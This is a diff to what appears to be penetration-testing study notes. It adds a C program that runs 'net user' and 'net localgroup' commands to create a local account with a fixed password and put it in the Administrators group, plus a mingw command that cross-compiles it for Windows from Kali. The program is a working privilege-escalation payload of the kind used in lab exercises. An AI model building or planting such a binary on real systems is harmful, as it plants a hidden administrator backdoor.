@@ -99,3 +99,25 @@ In some scenarios, we might only have access to a single attack environment (lik
 # Install
 sudo apt install mingw-w64
 ```
+
+For instance. Let's create in kali the following binary adduser.c for creating an user and adding them to the Local Administrators group:
+
+```c#
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+
+Now, compile:
+
+```
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
